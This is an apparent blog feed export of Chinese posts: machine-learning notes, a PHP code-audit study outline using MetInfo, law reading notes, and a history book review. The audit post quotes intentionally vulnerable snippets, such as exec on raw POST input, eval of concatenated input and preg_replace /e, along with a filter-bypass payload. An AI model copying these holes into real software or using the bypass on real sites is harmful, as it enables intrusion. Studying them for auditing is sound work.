&lt;p&gt;段分类的一个关键要素是，段与段之间的上下文是否进行分类。上下文的有效使用对于段分类来说至关重要。标准的分类算法一次只能有一个输入，解决这个问题的简单方法就是使用时间窗。但是时间窗会造成数据的移位和扭曲，而且不同时间窗对于段的影响也是未知的。&lt;/p&gt;
&lt;p&gt;段分类的衡量指标是段错误率&lt;/p&gt;
&lt;p&gt;在语音识别中，每个声音帧的语音分类作为一个单独的片段，通常称为帧音位分类。在这种情况下，段错误率就可以被称为帧错误率。很多神经网络结构被应用在这一领域。在图像处理中，通过图像分割把图像分成每一个像素或像素块。多维循环神经网络应用于这种情况。&lt;/p&gt;
&lt;h3 id=&quot;时间分类&quot;&gt;&lt;a href=&quot;#时间分类&quot; class=&quot;headerlink&quot; title=&quot;时间分类&quot;&gt;&lt;/a&gt;时间分类&lt;/h3&gt;&lt;p&gt;在一些情况下，我们不好对于标签序列做出什么假设，这种情况就可以用时间分类。&lt;/p&gt;
&lt;p&gt;时间分类和段分类的关键区别在于前者需要确定输入序列应当被分类的位置。这就需要一个隐式或显式的序列全局结构模型。&lt;/p&gt;
&lt;p&gt;显然，在这里我们需要新的衡量标准，我们通过计算将一个序列转换为另一个序列所需的替换、插入和删除的总数，给出了标签错误率来衡量。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;机器学习小白的阅读笔记，《Supervised Sequence Labelling with Recurrent Neural Networks》翻译，个人认为比较通俗易懂的相关英文文章~~&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="机器学习" scheme="http://phantom0301.cc/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="神经网络" scheme="http://phantom0301.cc/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计学习</title>
    <link href="http://phantom0301.cc/2017/06/06/codeaudit/"/>
    <id>http://phantom0301.cc/2017/06/06/codeaudit/</id>
    <published>2017-06-06T08:14:04.000Z</published>
    <updated>2017-06-08T09:13:36.939Z</updated>
    
    <content type="html">&lt;p&gt;这是一次分享准备。&lt;br&gt;自己还没有总结这个的能力，这次就当个搬运工好了~~&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-工具准备&quot;&gt;&lt;a href=&quot;#0x01-工具准备&quot; class=&quot;headerlink&quot; title=&quot;0x01 工具准备&quot;&gt;&lt;/a&gt;0x01 工具准备&lt;/h2&gt;&lt;p&gt;PHPSTORM，不只是编程。&lt;/p&gt;
&lt;p&gt;个人觉得只要能够提供全局搜索、单页搜索、函数跳转的编辑器就能够满足要求。一般在审计的时候，先找到一个入口点，配合代码和浏览器，一边下断点，一边打印变量，再在浏览器上观察反应。&lt;/p&gt;
&lt;p&gt;自动化审计工具，食之无味，弃之可惜。&lt;/p&gt;
&lt;p&gt;当然，我手边能用到的自动化审计工具就是能在网上找到资源的那几种。对于快速定位漏洞点来审计，自动化工具是有一定作用的，但是，大多数我能接触到的审计工具大抵是基于规则匹配的或者有一定的数据流向，但由于不能做到语义识别，很多逻辑控制语句无法识别，导致敏感点可可控参数无法自由的跳转结合。&lt;/p&gt;
&lt;p&gt;现在的习惯是，有了代码，先会扔进审计工具里跑一跑，看一个大概趋势，如果时间充裕，一般还是愿意一点一点从代码入口点跟进。&lt;/p&gt;
&lt;h2 id=&quot;0x02-审计初步&quot;&gt;&lt;a href=&quot;#0x02-审计初步&quot; class=&quot;headerlink&quot; title=&quot;0x02 审计初步&quot;&gt;&lt;/a&gt;0x02 审计初步&lt;/h2&gt;&lt;p&gt;审计可以从多个角度切入，首先是搞清楚审计对象的架构，是套了开源的框架，还是原生代码；是MVC，还是仅仅是函数调用。&lt;/p&gt;
&lt;p&gt;那么在审计之前，最好就是使用或者熟悉这些常见框架的特性机制。&lt;/p&gt;
&lt;p&gt;CI&lt;br&gt;&lt;a href=&quot;https://codeigniter.org.cn/&quot; title=&quot;https://codeigniter.org.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://codeigniter.org.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;YII2&lt;a href=&quot;http://www.yiichina.com/&quot; title=&quot;http://www.yiichina.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.yiichina.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ThinkPHP&lt;a href=&quot;http://www.thinkphp.cn/&quot; title=&quot;http://www.thinkphp.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.thinkphp.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Laravel&lt;a href=&quot;https://laravel.com/&quot; title=&quot;https://laravel.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://laravel.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;熟悉这些框架方便我们快速判断审计点。比如之前的一次代码审计就是套了ThinkPHP的核心代码，结果导致ThinkPHP的漏洞对于那套系统依然适用。&lt;/p&gt;
&lt;p&gt;为了能够边学习边实践别人的思想，我这里以MetInfo为例进行学习。&lt;/p&gt;
&lt;p&gt;对于快速审计，比如自动化工具，往往可以考虑以下一些切入点。&lt;/p&gt;
&lt;h5 id=&quot;敏感函数切入&quot;&gt;&lt;a href=&quot;#敏感函数切入&quot; class=&quot;headerlink&quot; title=&quot;敏感函数切入&quot;&gt;&lt;/a&gt;敏感函数切入&lt;/h5&gt;&lt;p&gt;敏感函数包括能够代码执行（PHP、MYSQL）的函数、上传下载文件的函数、文件读取的函数、加载资源的函数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;eval()- 海洋CMS6.28&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;@eval(“if(“.$strIf.”){\$ifFlag=true;}else{\$ifFlag=false;}”);&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;exec()-imo云办公&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$result = exec($_POST[‘command’]);&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;preg_replace()-Thinkphp2.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;preg_replace(‘/test/e’, ‘phpinfo()’, ‘just test’);&lt;/p&gt;
&lt;p&gt;preg_replace(‘@(w+)’.$depr.’([^’.$depr.’\/]+)@e’, ‘$var[\’\1\’]=”\2”;’, implode($depr,$paths));&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;system()-Family Connections CMS v2.5.0-v2.7.1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;assert()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;call_user_func()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;call_user_func_array()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;create_function&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;shell_exec()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;passthru()-Narcissus在线图像汇编器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;escapeshellcmd()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pcntl_exec() &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;反引号 ` 大括号{}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ob_start()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;array_map()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;proc_open()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;popen()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;require_once()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;include_once()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;file_get_contents()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;highlight_file()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fopen()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;readfile()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fread()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fgetss()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;fgets()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;parse_ini_file()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;show_source()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;file()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;echo XSS&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;……&lt;/p&gt;
&lt;p&gt;这一类的函数有很多，这种漏洞一般可能会呈现两种趋势，一种就是常用函数过滤绕过，一种是不常见函数用法失误的。&lt;/p&gt;
&lt;h5 id=&quot;漏洞点切入&quot;&gt;&lt;a href=&quot;#漏洞点切入&quot; class=&quot;headerlink&quot; title=&quot;漏洞点切入&quot;&gt;&lt;/a&gt;漏洞点切入&lt;/h5&gt;&lt;p&gt;如果说白盒找敏感函数的话，黑盒上对应的就是优先查找程序的SQL执行点、上传点、登录点、密码找回点等&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQL注入&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;登录页面、表单接收页面、信息显示页面&lt;/p&gt;
&lt;p&gt;普通拼接，这种不多说了，主流开源的代码想挖到这种已经很难了，要么没有拼接的用法，要么就做了更加严格的过滤。&lt;/p&gt;
&lt;p&gt;当然，这里有些小技巧，比如多次过滤情况下的绕过。如\include\mail\class.phpmailer.php的1741行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tip1:
$textMsg = trim(strip_tags(preg_replace(&amp;apos;/&amp;lt;(head|title|style|script)[^&amp;gt;]*&amp;gt;.*?&amp;lt;\/\\1&amp;gt;/s&amp;apos;,&amp;apos;&amp;apos;,$message)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里连续用了两个过滤函数，这两个函数在一起容易造成绕过。&lt;/p&gt;
&lt;p&gt;可以使用这两个payload做对比：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;evil&amp;lt;/head&amp;gt;

&amp;lt;he&amp;lt;&amp;gt;ad&amp;gt;evil&amp;lt;/head&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;编码注入： &lt;/p&gt;
&lt;p&gt;二次编码注入，addslashes、mysql_real_escape_string、mysql_escape_string或者开启GPC来转义，但是，如果再次使用urlencode就会出现二次编码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件包含&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;模块加载，模板加载，cache调用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;任意文件读取&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;寻找文件读取敏感函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件上传&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;move_uploaded_file()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件删除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;unlink()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;变量覆盖&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;extract()&lt;/p&gt;
&lt;p&gt;parse_str()&lt;/p&gt;
&lt;p&gt;$$&lt;/p&gt;
&lt;h5 id=&quot;index切入&quot;&gt;&lt;a href=&quot;#index切入&quot; class=&quot;headerlink&quot; title=&quot;index切入&quot;&gt;&lt;/a&gt;index切入&lt;/h5&gt;&lt;p&gt;从软件的index入口点开始，逐渐遍历到所有函数文件。&lt;/p&gt;
&lt;h2 id=&quot;0x03-审计实践&quot;&gt;&lt;a href=&quot;#0x03-审计实践&quot; class=&quot;headerlink&quot; title=&quot;0x03 审计实践&quot;&gt;&lt;/a&gt;0x03 审计实践&lt;/h2&gt;&lt;p&gt;这里以Metinfo为例进行演示,先大致了解一下该款CMS的结构。&lt;/p&gt;
&lt;p&gt;根目录下入口index.php,前台客户逻辑在/member/里，后台逻辑在/admin/里，自己创建的应用在/app/中，&lt;br&gt;前台的下载/搜索/等逻辑对应在相应的目录下。&lt;/p&gt;
&lt;p&gt;常用的功能函数集中在/include/下，重点在*.inc.php和*.func.php中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/index.php
    |
/include/common.inc.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个文件很有意思，比如里面有名的变量覆盖，由变量覆盖处跳转到过滤函数daddslashes(),明显这里有国瓷打补丁的痕迹，分享时现场细说，这里就不赘述。&lt;br&gt;    /include/common.inc.php&lt;br&gt;        |&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/include/head.php
    |
/app/
    |
/include/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;MetInfo由于特殊的变量传递机制和路由机制，使得我们可以轻易访问到任意PHP文件并且携带参数进行测试，所以对于它的审计顺序会更加松散一点。&lt;/p&gt;
&lt;p&gt;我这里先从关联性较弱的/about/，/upload/,/search/等几个文件夹看起，最后再集中阅读用户应用的/app/文件夹。&lt;/p&gt;
&lt;p&gt;利用前面说到的断点输出变量的方法一点一点调试实例，分享用。&lt;/p&gt;
&lt;p&gt;（&lt;a href=&quot;http://127.0.0.1/case/index.php?metid=1&amp;amp;filpy=&amp;amp;fmodule=0&amp;amp;modulefname=2）&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1/case/index.php?metid=1&amp;amp;filpy=&amp;amp;fmodule=0&amp;amp;modulefname=2）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;到这里都没有什么太大的发现，唯一的感受就是有很多点都很惊险，由于没有用MVC框架，显然很多SQL语句之间的写法差异都比较大。&lt;/p&gt;
&lt;p&gt;之后就可以跟进include的功能函数来看，也就是在这里终于知道了一个小漏洞。&lt;/p&gt;
&lt;p&gt;前台大概看得差不多，就可以跟进后台admin文件夹看看，这里就会觉得轻松很多，一个后台就不在适用过滤函数了，另一个后台功能更多一点，不过后台漏洞大多就只能算代码BUG，没有前台来得那么惊艳。&lt;/p&gt;
&lt;p&gt;大多数的内容打算分享的时候直接口述，这里其实只能算是一个大纲，所以文字上可能不是很通顺。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这是一次分享准备。&lt;br&gt;自己还没有总结这个的能力，这次就当个搬运工好了~~&lt;/p&gt;
    
    </summary>
    
      <category term="审计" scheme="http://phantom0301.cc/categories/%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://phantom0301.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>读读法律——《网络安全法》、《情报法》</title>
    <link href="http://phantom0301.cc/2017/05/19/security-law/"/>
    <id>http://phantom0301.cc/2017/05/19/security-law/</id>
    <published>2017-05-19T11:30:44.000Z</published>
    <updated>2017-05-19T12:37:29.980Z</updated>
    
    <content type="html">&lt;p&gt;学习一下《中华人民共和国网络安全法》和《中华人民共和国国家情报法》&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-安全法&quot;&gt;&lt;a href=&quot;#0x01-安全法&quot; class=&quot;headerlink&quot; title=&quot;0x01 安全法&quot;&gt;&lt;/a&gt;0x01 安全法&lt;/h2&gt;&lt;p&gt;《安全法》自2017年6月1日起施行。共七章七十九条。&lt;/p&gt;
&lt;p&gt;《安全法》首先是我国对于网络空间主权的宣示，提出对国内的管理以及与国外的合作。接着从国家、政府、企业、个人层面进行要求。&lt;/p&gt;
&lt;p&gt;其次，在理论科研层面，我们会完善标准指定，加强宣传工作，培养相关人才。而重点的方向在于网络安全认证、网络风险评估、网络数据保护等方向。&lt;/p&gt;
&lt;p&gt;接下来有几个个人注意的点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络运营者应该留存网络日志不少于六个月&lt;/li&gt;
&lt;li&gt;网络产品不得设置恶意程序（不知道以前的哪些流氓软件们的行为现在算违法吗？）&lt;/li&gt;
&lt;li&gt;网络产品、服务一旦出现漏洞，必须补救并告知用户、主管部门&lt;/li&gt;
&lt;li&gt;在安全维护和个人信息收集方面提出要求&lt;/li&gt;
&lt;li&gt;安全产品需要有安全认证&lt;/li&gt;
&lt;li&gt;发布相关漏洞信息应当遵守国家有关规定（什么规定？）&lt;/li&gt;
&lt;li&gt;不许非法入侵、不得提供非法入侵工具、不得提供入侵支持、推广、支付&lt;/li&gt;
&lt;li&gt;网络运营者必须要向国家相关部门提供支持和协助&lt;/li&gt;
&lt;li&gt;关键设施岗位安全背景审查，影响国家安全的关键设施采购需要国家安全审查&lt;/li&gt;
&lt;li&gt;关键设施个人信息数据出境需要安全评估&lt;/li&gt;
&lt;li&gt;经过处理无法识别特定个人且不能复原的个人信息可以向他人提供&lt;/li&gt;
&lt;li&gt;不得窃取、出售个人信息&lt;/li&gt;
&lt;li&gt;不得设立违法的网站、通讯群组&lt;/li&gt;
&lt;li&gt;电子信息违法时，运营商需要处置&lt;/li&gt;
&lt;li&gt;对人民政府在风险发生时的作为提出要求&lt;/li&gt;
&lt;li&gt;在一定条件下可以进行网络通信限制&lt;/li&gt;
&lt;li&gt;军事网络安全保护另行规定&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从上面这几个点，可以看出，国家对于网络安全的管理主要从网络运营商，关键设施运营商，个人几个方面开展。&lt;/p&gt;
&lt;p&gt;接下来，主要说说个人方面，一个是不得违法入侵、提供工具等，这就对于一些论坛的工具共享、黑客活动进行限制。另一个是不得建立非法网站和群组，这也就解释了最近QQ群管理加严的原因。&lt;/p&gt;
&lt;p&gt;再来看看个人方面的法律责任：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;没有遵守国家规定发布漏洞的：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;警告——1万~10万罚款（主管人员、直接责任人员5000~5万罚款）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非法入侵、提供工具等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;没收违法所得，5日以下拘留，5万~50万罚款——5~15日拘留，10万~100万罚款&lt;/p&gt;
&lt;p&gt;受到治安管理处罚——五年不得从事相关关键岗位工作&lt;/p&gt;
&lt;p&gt;刑事处罚——终身不得从事相关关键岗位工作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;建立违法网站、通讯群组&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5日以下拘留，1万~10万罚款——5~15日以下拘留，5万~50万罚款&lt;/p&gt;
&lt;p&gt;关闭网站、群组&lt;/p&gt;
&lt;h2 id=&quot;0x01-情报法（草案）&quot;&gt;&lt;a href=&quot;#0x01-情报法（草案）&quot; class=&quot;headerlink&quot; title=&quot;0x01 情报法（草案）&quot;&gt;&lt;/a&gt;0x01 情报法（草案）&lt;/h2&gt;&lt;p&gt;共五章二十八条&lt;/p&gt;
&lt;p&gt;《情报法》开门见山强调我们要建立国家情报体制，中央国家安全领导机构和中央军事委员会领导相应的情报工作。&lt;/p&gt;
&lt;p&gt;同样，个人关注一下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;国家情报工作可以经批准使用技术侦查措施&lt;/li&gt;
&lt;li&gt;国家情报机构工作人经批准，出示证件，可以查阅相关资料、可以进入相关区域、可以征用相关工具场地&lt;/li&gt;
&lt;li&gt;国家有关部门保障情报工作人员亲属安全&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当然，阅读情报法，主要关心的是对于情报的相关处罚措施。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;泄露国家秘密的，由情报工作人员建议相关单位：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;15日以下行政拘留——刑事责任&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;学习一下《中华人民共和国网络安全法》和《中华人民共和国国家情报法》&lt;/p&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="安全法规" scheme="http://phantom0301.cc/tags/%E5%AE%89%E5%85%A8%E6%B3%95%E8%A7%84/"/>
    
      <category term="情报法" scheme="http://phantom0301.cc/tags/%E6%83%85%E6%8A%A5%E6%B3%95/"/>
    
      <category term="网络安全法" scheme="http://phantom0301.cc/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>《万历十五年》读书笔记</title>
    <link href="http://phantom0301.cc/2017/05/12/wanli/"/>
    <id>http://phantom0301.cc/2017/05/12/wanli/</id>
    <published>2017-05-12T13:09:06.000Z</published>
    <updated>2017-05-12T13:47:10.639Z</updated>
    
    <content type="html">&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;最近《人民的名义》很火，据说书中高育良欣赏高小凤便是因为此书，正好闲暇时间又在补《大明王朝1566》，嘉靖、隆庆、万历祖孙三也都悉数登场，所以就乘此机会补了一下这本书。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-顺从与叛逆&quot;&gt;&lt;a href=&quot;#0x01-顺从与叛逆&quot; class=&quot;headerlink&quot; title=&quot;0x01 顺从与叛逆&quot;&gt;&lt;/a&gt;0x01 顺从与叛逆&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;书中开篇第一章便是讲万历皇帝，对于万历，最初的印象是幼时读余秋雨的文章，文中提到万历多年不上早朝，于是史学家最后下推断万历躲在后宫吸食了二十多年的鸦片云云。余先生又提到女真入侵大明时，军队急需补给，但万历却抠门到只愿拿出一丁点“发霉的碎银”打发那些前线的武人。自然，这么一说，大明的灭亡恐怕就要被算在他朱翊钧的头上了。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;后来年岁稍长，又略读过诸朝史事，大抵知道万历初年，在首辅张居正的悉心教育下，小皇帝至少表面上表现的还是勤勉图治的，据说张居正将前朝历代君王得失亲自编纂成册，教受于小皇帝。一时间，内廷的李太后、大伴冯保到厅阁中的张居正，都可以说是齐心督管小皇帝，只是不知道叛逆的种子是不是也就在此时埋在了万历皇帝的心中。据说，在读书教育问题上，生母李太后，老师张居正都是严格到近乎苛刻，小皇帝应该干什么不应该干什么都被他们所限制，稍有不配合便可能遭到来自道德层面的谴责，“道德”也正是《万历》一书中多次被强调的一种精神。而我们能从史书看到的就是在朱翊钧幼时对于这种教导还是比较配合的。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;皇帝年幼，宫中府中又俱为一体，这也就为张居正的改革带来了很优越的条件。史书上历来改革者都是得到最高层支持的孤独者形象，改革无疑就会触动到既得利益者的反对，而在我们古老的国家里，讲究师出有名，我们的那些道德领袖们又及其擅长运用修辞学来将对手描绘成道德败类，无论最初的目的是多么不可告人，只要将自己摆在道德高位，便能够自欺，欺人一箭双雕，更令人诧异的是，这种自欺往往最后就会演变成一种自信，使得攻讦者自己都认为自己的所作所为是站在大无畏的道德高位上，与斯文败类的斗争。而在诸多道德指责中，不孝又是最能够驱小力而搏巨擘的说辞。张居正便因不孝而被推到了风口浪尖，当然，这个时候小皇帝和内府站在了他的这一边，虽然风暴猛烈，但张居正依然可以巍然不动。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;那么其实，站在我们自身的角度来看，对万历皇帝早年的近乎压抑的约束一定会为后来更加疯狂的举动埋下伏笔。小皇帝亲政后，随着张居正的离世，这段看似美好的平衡最终被打破，这无疑为万历的思想注入了第一层悲剧的元素。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;明朝是这样一个矛盾的王朝，一方面为了巩固中央集权而废除丞相，限制武将。对武将的限制最终导致了明朝原属军队的战斗力低下，而对文官的限制又反而加深了皇帝与文官集团的对立，因为文官体系的名义上的无权，使得一切的国家决定的成败全部落在了皇帝的身上。于是，一旦文官集团陷入对朝局不满的状态，那么在他们的对立面上，原来应该有一层的缓冲带就被打破，而直接面对着皇帝。另一方面，以内阁机制来代替丞相机制，有一个很明显的不同在于，后者的担任者原则上应该是具有行政、管理等能力的人，而内阁的备资讯性质使得它的担任者往往更多是在儒家学术（很多时候可能是指文学）上有成就的学者，而更有悲剧意味的是儒家学说在经过一代又一代的解说或者说是限制后，到这时恐怕更多的是禁锢，这种禁锢使得这样一个以备咨询为首的文官组织敢于站在皇帝的对立面，尤其是万历这种小时即位，被灌输了要以明君要求自己的帝王。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;万历早年被张居正和太后等约束，在尝试了长大后的一点点自由后，又发现被群臣所限制，这样一个集团不接受他对身边爱妃的加封，不接受他个人对继承人的指定，不接受他的一切不合儒家规范的举动。这种压抑使得万历早年的明君教育与现在他想去做的事情形成了强烈的矛盾，这种矛盾使万历想要反抗群臣但又无法真正做到，最终，万历选择了另一种方式来抗争，这可以被视为一种非暴力不合作方式，万历故意躲避群臣，故意在小的方面做一点仪式性的反抗来换取内心的平衡。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;从这种角度来看，万历就像是青春期的孩子一般，在童年一味顺从后，反叛的内心终于在此时爆发。&lt;/p&gt;
&lt;h2 id=&quot;0x02-变革和守成&quot;&gt;&lt;a href=&quot;#0x02-变革和守成&quot; class=&quot;headerlink&quot; title=&quot;0x02 变革和守成&quot;&gt;&lt;/a&gt;0x02 变革和守成&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;张居正和历朝历代的变革者一洋，最终成为众矢之的，当这些社会精英站在巅峰之时，是否会曾想过历史潮流中的那些先烈们的结局，是否会因此为自己想一想出路。无论是否想到或者甚至为自己准备后路，结局我们都已经看到了。其实从某种角度来看，明朝的制度最初便充满了问题，直到此时恐怕已经积重难返。任何时候王朝的兴盛都离不开商业，但是明朝制度从最初便是把一个一个的社会人都禁锢在他们的土地上，在最初就是在制约商业经济的发展，这和同时代的日本形成了对比，日本松散的社会制度导致包括商人、僧人在内的社会阶层都能够拥有自己的一份力量，商人的兴盛极大促进了日本商品的流通，最终带来的是科技技术的流动。反观大明，此时的明朝从赋税到军队，无一不都被钉死在自己的区域里。张居正希望能够改变，实时上同时代的俞大猷等人也尝试变革，但此时的儒家信徒们大都以祖制如此为由，生怕自己的体面生活被打破。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;申时行做为继任者，显然没有展示出张居正一样的雷厉手段，我们不知道当日当时的申时行是怎么想的，是看见前任的凄惨下场，或者仅仅是个人的处世哲学，或者是文官集团的强大压力，或者他本身就是保守文官集团的一份子。不过有一点我们是可以知道的，就是当整个文官集团倚儒卖儒的时候，申时行清楚认识到了万历皇帝的叛逆，作为清楚的认识者，他一不能阻止整个文官集团的碰钉行为，二不能左右已经成人的小皇帝的意志，他只能竭力去充当两大对立者的和事老，看得出来，作为一个和前任相比会显得平庸的首辅，他不会去在做什么大的变革，但他也努力让整个明朝局势不要太恶化。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;戚继光就认识到了变革的困难，所以在他的能力范围内，他追求能够有一些变化。不得不佩服这位武将的智慧，也正是他的这种中庸，使得他既能够建立起一支当时唯一还有一点战斗力的军队，将大明即将倾覆的马车又赶了很长一段路程。戚继光有时让我想到了封常清——那个最初代表中央对抗安禄山军队的人，封常清并非庸将，只是当他到达边关时才发现大唐的军队已经如此腐朽，不得已只能带着已经失去战斗力的大唐军队去对付安禄山的精锐。同样，最初的戚继光一定也看到了大明军队已然不堪一击，只是幸运的是，他还有机会重新训练一支可以打仗的军队。但大明的祖制不会允许他采取彻底的改革，于是戚继光一方面知道要获得最高层的支持，一方面懂得如何变通的进行变化，最终为大明的军队挽回了一丝颜面。&lt;/p&gt;
&lt;h2 id=&quot;0x03-清廉无为与贪污立功&quot;&gt;&lt;a href=&quot;#0x03-清廉无为与贪污立功&quot; class=&quot;headerlink&quot; title=&quot;0x03 清廉无为与贪污立功&quot;&gt;&lt;/a&gt;0x03 清廉无为与贪污立功&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;一直以来，历史都会给我们一个难题，两全其美固然很好，但是如果只能取其一，清廉但碌碌无为，贪污但使社会进步，你到底选哪个？这里就要说说海瑞，历史上海瑞一直有刚正不阿，清正廉洁之名，和他相比，无论文官集团的徐阶、高拱、张居正，还是军旅队伍的戚继光、胡宗宪，都多多少少留下了收贿受贿的记录。&lt;/p&gt;
